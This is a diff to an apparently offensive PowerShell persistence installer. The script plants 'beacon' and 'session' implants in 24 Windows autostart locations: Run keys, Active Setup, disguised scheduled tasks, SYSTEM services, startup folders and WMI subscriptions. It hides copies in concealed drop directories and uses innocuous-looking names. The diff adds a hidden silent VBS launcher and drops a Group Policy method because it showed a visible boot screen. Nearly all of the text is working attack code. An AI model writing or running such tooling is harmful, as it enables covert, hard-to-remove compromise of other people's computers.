@@ -4,12 +4,13 @@
 #               T1547.010 T1543.003 T1546.003 T1197
 #
 # 24 persistence locations:
-#   Registry (7): HKLM Run, HKCU Run, WOW64 Run, Userinit, Policies\Explorer\Run, Active Setup x2
+#   Registry (6): HKLM Run, HKCU Run, WOW64 Run, Policies\Explorer\Run, Active Setup x2
+#   Startup  (4): All-users LNK, All-users BAT, All-users VBS, Current-user EXE
 #   Tasks    (8): PerfTrack, USOPrivate, Office16, WindowsUpdate, Defrag, DiskCleanup, NetTrace, Registry
 #   Services (2): CryptSvcMonitor (beacon), WmiPerfSvcHost (session)
 #   Startup  (3): All-users LNK, All-users BAT, Current-user EXE
 #   WMI      (3): 30-min timer (VBScript), explorer-start, lsass-start
-#   Misc     (1): GP State Machine startup script
+#   Misc     (1): HKLM Run alt (GP State script removed -- triggered Group Policy boot screen)
 #
 # Run as: Administrator
 #Requires -RunAsAdministrator
@@ -58,6 +59,32 @@ $BeaconPath  = (Resolve-Path $BeaconPath).Path
 $SessionPath = (Resolve-Path $SessionPath).Path
 Write-Info "Beacon  : $BeaconPath"
 Write-Info "Session : $SessionPath"
+
+# --- Shell repair: reset Winlogon\Shell to explorer.exe if it was corrupted ---
+Write-Section "Shell Repair"
+try {
+    $wlKey    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    $curShell = (Get-ItemProperty $wlKey -Name "Shell" -ErrorAction Stop).Shell
+    if ($curShell -ne "explorer.exe") {
+        Set-ItemProperty $wlKey -Name "Shell" -Value "explorer.exe" -Force
+        Write-Warn "Shell was [$curShell] -- reset to explorer.exe"
+    } else {
+        Write-Info "Shell already clean: explorer.exe"
+    }
+} catch { Write-Warn "Shell repair check failed: $_" }
+
+# --- Userinit repair: strip any appended entries, keep only userinit.exe ---
+try {
+    $wlKey  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+    $curUI  = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
+    $clean  = "$env:SystemRoot\system32\userinit.exe,"
+    if ($curUI -ne $clean) {
+        Set-ItemProperty $wlKey -Name "Userinit" -Value $clean -Force
+        Write-Warn "Userinit was [$curUI] -- reset to $clean"
+    } else {
+        Write-Info "Userinit already clean"
+    }
+} catch { Write-Warn "Userinit repair check failed: $_" }
 
 # --- Drop directories (spread copies across multiple hidden dirs) ---
 $DropDirs = @(
@@ -113,6 +140,7 @@ function Get-SvcBinPath {
     return "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$WrapperPath`""
 }
 
+
 $script:Ok   = 0
 $script:Fail = 0
 
@@ -160,19 +188,19 @@ if ($p3) {
     } catch { Write-Err "  WOW64 Run failed: $_"; $script:Fail++ }
 } else { $script:Fail++ }
 
-# [4] Winlogon Userinit append - beacon
-Write-Info "[4/24] Winlogon Userinit -- beacon"
-$p4 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}winlogon-ext.exe")
+# [4] All-users startup VBS - beacon (silent WScript.Shell.Run, no Winlogon touch)
+Write-Info "[4/24] All-users startup VBS -- beacon"
+$p4 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}windiag-vbs-host.exe")
 if ($p4) {
     try {
-        $wlKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-        $cur   = (Get-ItemProperty $wlKey -Name "Userinit" -ErrorAction Stop).Userinit
-        if ($cur -notlike "*$p4*") {
-            Set-ItemProperty $wlKey -Name "Userinit" -Value ($cur.TrimEnd(',') + ",$p4") -Force
-        }
-        Write-Success "  Winlogon Userinit appended: $p4"
+        $vbs  = Join-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" "${pfx}windiag_svc.vbs"
+        $vbsContent = "Set oShell = CreateObject(""WScript.Shell"") : oShell.Run """"""" & $p4 & """"""" & "", 0, False"
+        [System.IO.File]::WriteAllText($vbs, $vbsContent, [System.Text.Encoding]::ASCII)
+        $item = Get-Item $vbs -Force
+        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
+        Write-Success "  Startup VBS: $vbs -> $p4"
         $script:Ok++
-    } catch { Write-Err "  Winlogon Userinit failed: $_"; $script:Fail++ }
+    } catch { Write-Err "  Startup VBS failed: $_"; $script:Fail++ }
 } else { $script:Fail++ }
 
 # [5] Policies\Explorer\Run - session (Group Policy run key, fires at logon, doesn't touch the shell)
@@ -526,26 +554,18 @@ if ($p23) {
 # =============================================================================
 Write-Section "Misc (24)"
 
-# [24] GP State Machine startup script - beacon
-Write-Info "[24/24] GP State startup script -- beacon"
-$p24 = Copy-Hidden $BeaconPath (Join-Path (Get-DropDir) "${pfx}gp-startup-svc.exe")
+# [24] HKLM Run (second session entry) - session
+# GP State script removed: writing to Group Policy\State\Machine\Scripts\Startup caused
+# the Group Policy Client to show "Applying your personal settings" at every boot.
+Write-Info "[24/24] HKLM Run (WinSecHostSvc) -- session"
+$p24 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}winsec-host-svc.exe")
 if ($p24) {
     try {
-        $gpBase   = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Scripts\Startup\0"
-        $gpScript = "$gpBase\0"
-        if (-not (Test-Path $gpBase))   { New-Item -Path $gpBase   -Force | Out-Null }
-        if (-not (Test-Path $gpScript)) { New-Item -Path $gpScript -Force | Out-Null }
-        Set-ItemProperty $gpBase   "GPO-ID"       "LocalGPO"                               -Force
-        Set-ItemProperty $gpBase   "SOM-ID"       "Local"                                  -Force
-        Set-ItemProperty $gpBase   "Count"        1                       -Type DWord       -Force
-        Set-ItemProperty $gpBase   "ExecTime"     ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary  -Force
-        Set-ItemProperty $gpScript "Script"       $p24                                     -Force
-        Set-ItemProperty $gpScript "Parameters"   ""                                       -Force
-        Set-ItemProperty $gpScript "IsPowershell" 0                       -Type DWord       -Force
-        Set-ItemProperty $gpScript "ExecTime"     ([byte[]](0,0,0,0,0,0,0,0)) -Type Binary  -Force
-        Write-Success "  GP State startup script -> $p24"
+        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+            -Name "${pfx}WinSecHostSvc" -Value "`"$p24`"" -Type String -Force
+        Write-Success "  HKLM Run\${pfx}WinSecHostSvc -> $p24"
         $script:Ok++
-    } catch { Write-Err "  GP State startup script failed: $_"; $script:Fail++ }
+    } catch { Write-Err "  HKLM Run #2 failed: $_"; $script:Fail++ }
 } else { $script:Fail++ }
 
 # =============================================================================
@@ -560,7 +580,7 @@ Write-Host "  --- REGISTRY (7) ---" -ForegroundColor Magenta
 Write-Host "  [ 1] HKLM Run               -> beacon  (fires at every user logon)"              -ForegroundColor Cyan
 Write-Host "  [ 2] HKCU Run               -> session (fires at current user logon)"            -ForegroundColor Cyan
 Write-Host "  [ 3] WOW6432Node Run        -> beacon  (fires at every user logon)"              -ForegroundColor Cyan
-Write-Host "  [ 4] Winlogon Userinit      -> beacon  (appended to login chain)"                -ForegroundColor Cyan
+Write-Host "  [ 4] All-users startup VBS  -> beacon  (silent WScript.Shell, no Winlogon touch)" -ForegroundColor Cyan
 Write-Host "  [ 5] Policies\Explorer\Run  -> session (Group Policy run key, fires at logon)"   -ForegroundColor Cyan
 Write-Host "  [ 6] Active Setup {76E4F460}-> beacon  (first logon per user)"                   -ForegroundColor Cyan
 Write-Host "  [ 7] Active Setup {8A69D345}-> session (first logon per user)"                   -ForegroundColor Cyan
@@ -576,7 +596,7 @@ Write-Host "  [15] \Microsoft\Windows\Registry\           -> session (30min)"   
 Write-Host "  --- SERVICES (2) ---" -ForegroundColor Magenta
 Write-Host "  [16] CryptSvcMonitor        -> beacon  (AUTO_START, SYSTEM, fail-restart)"       -ForegroundColor Cyan
 Write-Host "  [17] WmiPerfSvcHost         -> session (AUTO_START, SYSTEM, fail-restart)"       -ForegroundColor Cyan
-Write-Host "  --- STARTUP FOLDERS (3) ---" -ForegroundColor Magenta
+Write-Host "  --- STARTUP FOLDERS (4) ---" -ForegroundColor Magenta
 Write-Host "  [18] All-users LNK          -> beacon  ($AllUsersStartup)"                       -ForegroundColor Cyan
 Write-Host "  [19] All-users BAT          -> session ($AllUsersStartup)"                       -ForegroundColor Cyan
 Write-Host "  [20] Current-user EXE       -> beacon  ($CurrentUserStartup)"                    -ForegroundColor Cyan
@@ -585,7 +605,7 @@ Write-Host "  [21] 30-min timer (VBScript)-> session (runs inside WmiPrvSE.exe)"
 Write-Host "  [22] explorer.exe start     -> beacon"                                           -ForegroundColor Cyan
 Write-Host "  [23] lsass.exe start        -> session"                                          -ForegroundColor Cyan
 Write-Host "  --- MISC (1) ---" -ForegroundColor Magenta
-Write-Host "  [24] GP State startup script-> beacon  (HKLM Group Policy State)"               -ForegroundColor Cyan
+Write-Host "  [24] HKLM Run (WinSecHostSvc) -> session (fires at every user logon)"              -ForegroundColor Cyan
 Write-Host ""
 Write-Host "  Drop directories:" -ForegroundColor Yellow
 foreach ($d in $DropDirs) { Write-Host "    $d" -ForegroundColor Yellow }
